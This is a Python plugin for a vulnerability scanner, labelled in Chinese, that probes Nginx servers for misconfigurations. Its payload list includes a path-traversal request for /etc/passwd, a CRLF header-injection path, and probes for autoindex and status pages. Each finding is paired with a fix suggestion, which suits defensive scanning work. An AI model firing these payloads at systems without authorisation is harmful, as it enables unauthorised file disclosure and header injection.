from app.scanner.base import BaseScanner
from app.scanner.loader import register_scanner
from app.utils.http_client import http_request
from app.utils.logger import get_logger

logger = get_logger("nginx_vuln")


@register_scanner
class NginxVulnScanner(BaseScanner):
    name = "Nginx 路径穿越/解析漏洞集"
    description = "Nginx配置错误导致的路径穿越、文件解析漏洞"
    category = "nginx"
    module = "nginx_vuln"
    risk_level = "high"
    risk_score = 8
    cve_ids = ["CVE-2021-23017", "CVE-2019-11043"]
    references = [
        "https://nvd.nist.gov/vuln/detail/CVE-2021-23017",
        "https://nvd.nist.gov/vuln/detail/CVE-2019-11043",
    ]
    fix_suggestion = "升级Nginx版本，正确配置alias和location指令"

    PAYLOADS = [
        {
            "name": "Nginx alias 路径穿越",
            "path": "/static../etc/passwd",
            "marker": "root:",
            "risk_level": "critical",
            "risk_score": 9,
        },
        {
            "name": "Nginx CRLF注入",
            "path": "/%0d%0aSet-Cookie:crlf=injection",
            "marker": "Set-Cookie",
            "check_header": True,
            "risk_level": "medium",
            "risk_score": 5,
        },
        {
            "name": "Nginx 目录遍历",
            "path": "/",
            "check_autoindex": True,
            "marker": "Index of",
            "risk_level": "medium",
            "risk_score": 5,
        },
        {
            "name": "Nginx server-status 信息泄露",
            "path": "/nginx_status",
            "marker": "Active connections",
            "risk_level": "medium",
            "risk_score": 5,
        },
        {
            "name": "Nginx stub_status 信息泄露",
            "path": "/stub_status",
            "marker": "server accepts handled requests",
            "risk_level": "medium",
            "risk_score": 5,
        },
    ]

    def _detect_nginx(self) -> bool:
        resp = http_request("GET", self.target)
        if resp is None:
            return False
        server = resp.headers.get("Server", "")
        if "nginx" in server.lower():
            return True
        if "nginx" in resp.text.lower() and resp.status_code in [403, 404]:
            return True
        return False

    def check(self) -> bool:
        is_nginx = self._detect_nginx()
        if not is_nginx:
            resp = http_request("GET", self.target)
            if resp and resp.headers.get("Server", "").lower().find("nginx") < 0:
                return False

        server_resp = http_request("GET", self.target)
        if server_resp:
            server_header = server_resp.headers.get("Server", "")
            if "nginx" in server_header.lower():
                self.add_result(
                    name="Nginx 版本信息泄露",
                    risk_level="info",
                    risk_score=1,
                    target_url=self.target,
                    detail=f"Server头暴露Nginx版本: {server_header}",
                    evidence=f"Server: {server_header}",
                    fix_suggestion="在nginx.conf中添加 server_tokens off;",
                )

        found = False
        for payload in self.PAYLOADS:
            if payload.get("check_autoindex"):
                resp = http_request("GET", self.target)
                if resp and "Index of" in resp.text and "Parent Directory" in resp.text:
                    self.add_result(
                        name="Nginx 目录遍历",
                        risk_level=payload["risk_level"],
                        risk_score=payload["risk_score"],
                        target_url=self.target,
                        detail="Nginx开启了autoindex，可浏览目录结构",
                        evidence="页面包含 Index of 和 Parent Directory",
                        fix_suggestion="关闭autoindex: autoindex off;",
                    )
                    found = True
                continue

            url = f"{self.target}{payload['path']}"
            resp = http_request("GET", url, allow_redirects=False)
            if resp is None:
                continue

            if payload.get("check_header"):
                if payload["marker"] in str(resp.headers):
                    self.add_result(
                        name=payload["name"],
                        risk_level=payload["risk_level"],
                        risk_score=payload["risk_score"],
                        target_url=url,
                        detail="Nginx CRLF注入漏洞",
                        evidence=f"响应头包含注入的: {payload['marker']}",
                    )
                    found = True
                continue

            if resp.status_code == 200 and payload["marker"] in resp.text:
                self.add_result(
                    name=payload["name"],
                    risk_level=payload["risk_level"],
                    risk_score=payload["risk_score"],
                    target_url=url,
                    detail=f"Nginx漏洞: {payload['name']}",
                    response_snippet=resp.text[:500],
                    evidence=f"响应包含敏感信息: {payload['marker']}",
                )
                found = True

        return found
